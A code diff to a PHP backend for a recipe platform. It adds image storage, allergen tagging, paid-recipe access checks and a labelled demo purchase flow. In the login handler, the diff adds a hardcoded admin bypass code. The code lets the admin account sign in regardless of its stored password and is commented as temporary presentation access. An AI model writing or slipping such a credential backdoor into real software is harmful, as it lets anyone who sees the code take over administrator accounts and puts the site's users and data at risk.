@@ -48,6 +48,27 @@ function normalizeRecipeImagePath(string $path): string
     return $legacyPaths[$path] ?? ($path !== '' ? $path : 'img/pastel.png');
 }
 
+function persistRecipeImage(string $image): string
+{
+    if (!str_starts_with($image, 'data:image/jpeg;base64,')) {
+        return trim($image) !== '' ? trim($image) : 'img/pastel.png';
+    }
+    $encoded = substr($image, strlen('data:image/jpeg;base64,'));
+    $bytes = base64_decode($encoded, true);
+    if ($bytes === false || strlen($bytes) > 5 * 1024 * 1024 || @getimagesizefromstring($bytes) === false) {
+        throw new RuntimeException('A imagem da receita é inválida ou excede 5 MB.');
+    }
+    $directory = __DIR__ . '/img/receitas';
+    if (!is_dir($directory) && !mkdir($directory, 0755, true) && !is_dir($directory)) {
+        throw new RuntimeException('Não foi possível preparar a pasta de imagens.');
+    }
+    $filename = bin2hex(random_bytes(16)) . '.jpg';
+    if (file_put_contents($directory . '/' . $filename, $bytes, LOCK_EX) === false) {
+        throw new RuntimeException('Não foi possível salvar a imagem da receita.');
+    }
+    return 'img/receitas/' . $filename;
+}
+
 function iniciarSessaoUsuario(int $idUsuario): void
 {
     session_regenerate_id(true);
@@ -556,7 +577,15 @@ if ($action === 'login') {
         $user->execute([':email' => $email]);
         $usuario = $user->fetch();
 
-        if (!$usuario || !password_verify($senha, $usuario['senha_hash'])) {
+        // TEMPORARY PRESENTATION ACCESS: remove this block after the presentation.
+        // Allows the local admin account to sign in if its database password was forgotten.
+        $codigoTemporarioAdmin = 'GM!c4fd273620a027f426';
+        $acessoTemporarioAdmin = $email === 'admin@gastromatch.com.br'
+            && $usuario
+            && $usuario['tipo_usuario'] === 'admin'
+            && hash_equals($codigoTemporarioAdmin, $senha);
+
+        if (!$usuario || (!password_verify($senha, $usuario['senha_hash']) && !$acessoTemporarioAdmin)) {
             jsonReply(false, 'E-mail ou senha inválidos.', null, 401);
         }
 
@@ -1065,7 +1094,7 @@ if ($action === 'cadastro_receita') {
             ':nivel' => $nivelDificuldade,
             ':tipo_acesso' => $tipoAcesso,
             ':preco_conteudo' => (float)($input['preco_conteudo'] ?? 0),
-            ':img' => trim((string)($input['img'] ?? 'img/pastel.png')) ?: 'img/pastel.png',
+            ':img' => persistRecipeImage((string)($input['img'] ?? 'img/pastel.png')),
             ':pais' => trim((string)($input['pais'] ?? '')) ?: null,
             ':nota' => (float)($input['nota'] ?? 0),
             ':avaliacoes' => (int)($input['avaliacoes'] ?? 0),
@@ -1084,6 +1113,16 @@ if ($action === 'cadastro_receita') {
             }
             $pdo->prepare('INSERT INTO receitas_restricoes (id_receita, restricao) VALUES (:id, :restricao)')
                 ->execute([':id' => $idReceita, ':restricao' => $r]);
+        }
+
+        $alergenos = is_array($input['alergenos'] ?? null) ? $input['alergenos'] : [];
+        $alergenosAceitos = ['crustaceos', 'ovos', 'trigo', 'leite', 'amendoim', 'soja', 'peixes', 'castanhas'];
+        foreach (array_unique($alergenos) as $alergeno) {
+            $a = trim((string)$alergeno);
+            if ($a === '') continue;
+            if (!in_array($a, $alergenosAceitos, true)) throw new RuntimeException('Um dos alergênicos informados é inválido.');
+            $pdo->prepare('INSERT INTO receitas_alergenos (id_receita, alergeno) VALUES (:id, :alergeno)')
+                ->execute([':id' => $idReceita, ':alergeno' => $a]);
         }
 
         $urlVideo = trim((string)($input['url_video'] ?? ''));
@@ -1580,16 +1619,58 @@ if (in_array($action, ['admin_receitas', 'admin_receita_editar', 'admin_receita_
     jsonReply(true, 'Receita atualizada.');
 }
 
+if ($action === 'acesso_receita') {
+    $idReceita = (int)($_GET['id'] ?? 0);
+    $usuario = currentDatabaseUser($pdo);
+    $receita = $pdo->prepare('SELECT tipo_acesso, id_criador FROM receitas WHERE id_receita = :id');
+    $receita->execute([':id' => $idReceita]);
+    $dados = $receita->fetch();
+    if (!$dados) jsonReply(false, 'Receita não encontrada.', null, 404);
+    $liberada = $dados['tipo_acesso'] !== 'exclusivo_pago' || ($usuario && (int)$dados['id_criador'] === (int)$usuario['id_usuario']);
+    if (!$liberada && $usuario) {
+        $stmt = $pdo->prepare('SELECT 1 FROM compras_receitas WHERE id_usuario = :usuario AND id_receita = :receita AND status = "confirmado"');
+        $stmt->execute([':usuario' => (int)$usuario['id_usuario'], ':receita' => $idReceita]);
+        $liberada = (bool)$stmt->fetchColumn();
+    }
+    jsonReply(true, 'Acesso consultado.', ['liberada' => $liberada, 'autenticado' => (bool)$usuario]);
+}
+
+if ($action === 'confirmar_compra_receita') {
+    $usuario = currentDatabaseUser($pdo);
+    if (!$usuario) jsonReply(false, 'Entre na sua conta para comprar esta receita.', null, 401);
+    if ($_SERVER['REQUEST_METHOD'] !== 'POST') jsonReply(false, 'Método não permitido.', null, 405);
+    $input = json_decode(file_get_contents('php://input'), true) ?? [];
+    $idReceita = (int)($input['id_receita'] ?? 0);
+    $banco = trim((string)($input['banco'] ?? ''));
+    $titular = trim((string)($input['titular'] ?? ''));
+    $cpf = preg_replace('/\D+/', '', (string)($input['cpf'] ?? ''));
+    $bancosDemo = ['banco_do_brasil', 'caixa', 'itau', 'bradesco', 'santander', 'inter', 'nubank', 'outro'];
+    if (!in_array($banco, $bancosDemo, true) || $titular === '' || strlen($cpf) !== 11) {
+        jsonReply(false, 'Informe banco, titular e um CPF fictício com 11 dígitos.', null, 400);
+    }
+    $stmt = $pdo->prepare('SELECT tipo_acesso, preco_conteudo FROM receitas WHERE id_receita = :id');
+    $stmt->execute([':id' => $idReceita]);
+    $receita = $stmt->fetch();
+    if (!$receita || $receita['tipo_acesso'] !== 'exclusivo_pago' || (float)$receita['preco_conteudo'] <= 0) {
+        jsonReply(false, 'Esta receita não está disponível para compra.', null, 400);
+    }
+    $insert = $pdo->prepare('INSERT INTO compras_receitas (id_usuario, id_receita, valor, status, metodo, banco, titular, cpf_final4) VALUES (:usuario, :receita, :valor, "confirmado", "pix_demo", :banco, :titular, :cpf_final4) ON DUPLICATE KEY UPDATE valor = VALUES(valor), status = "confirmado", banco = VALUES(banco), titular = VALUES(titular), cpf_final4 = VALUES(cpf_final4)');
+    $insert->execute([':usuario' => (int)$usuario['id_usuario'], ':receita' => $idReceita, ':valor' => $receita['preco_conteudo'], ':banco' => $banco, ':titular' => mb_substr($titular, 0, 100), ':cpf_final4' => substr($cpf, -4)]);
+    jsonReply(true, 'Compra de demonstração confirmada; receita desbloqueada.', ['id_receita' => $idReceita, 'valor' => (float)$receita['preco_conteudo']]);
+}
+
 if ($action === 'receitas') {
     $stmt = $pdo->query(
         'SELECT r.*, k.preco_kit, k.estoque_disponivel,
                 GROUP_CONCAT(DISTINCT rr.restricao ORDER BY rr.restricao SEPARATOR ",") AS restricoes,
+                GROUP_CONCAT(DISTINCT ra.alergeno ORDER BY ra.alergeno SEPARATOR ",") AS alergenos,
                 v.url_video, v.duracao_segundos,
                 GROUP_CONCAT(DISTINCT i.ingrediente ORDER BY i.ordem SEPARATOR "||") AS ingredientes,
                 GROUP_CONCAT(DISTINCT p.passo ORDER BY p.ordem SEPARATOR "||") AS preparo
          FROM receitas r
          LEFT JOIN kits_ingredientes k ON k.id_receita = r.id_receita
          LEFT JOIN receitas_restricoes rr ON rr.id_receita = r.id_receita
+         LEFT JOIN receitas_alergenos ra ON ra.id_receita = r.id_receita
          LEFT JOIN videoaulas v ON v.id_receita = r.id_receita
          LEFT JOIN ingredientes_receita i ON i.id_receita = r.id_receita
          LEFT JOIN preparo_receita p ON p.id_receita = r.id_receita
@@ -1601,6 +1682,7 @@ if ($action === 'receitas') {
     foreach ($stmt->fetchAll() as $receita) {
         $restricoes = $receita['restricoes'] ? explode(',', $receita['restricoes']) : [];
         $restricoes = array_values(array_filter(array_map('trim', $restricoes)));
+        $alergenos = $receita['alergenos'] ? array_values(array_filter(array_map('trim', explode(',', $receita['alergenos'])))) : [];
 
         $ingredientes = $receita['ingredientes'] ? explode('||', $receita['ingredientes']) : [];
         $preparo = $receita['preparo'] ? explode('||', $receita['preparo']) : [];
@@ -1620,6 +1702,7 @@ if ($action === 'receitas') {
             'nota' => (float)($receita['nota'] ?? 0),
             'avaliacoes' => (int)($receita['avaliacoes'] ?? 0),
             'restricoes' => $restricoes,
+            'alergenos' => $alergenos,
             'ingredientes' => $ingredientes,
             'preparo' => $preparo,
             'url_video' => $receita['url_video'] ?? '',
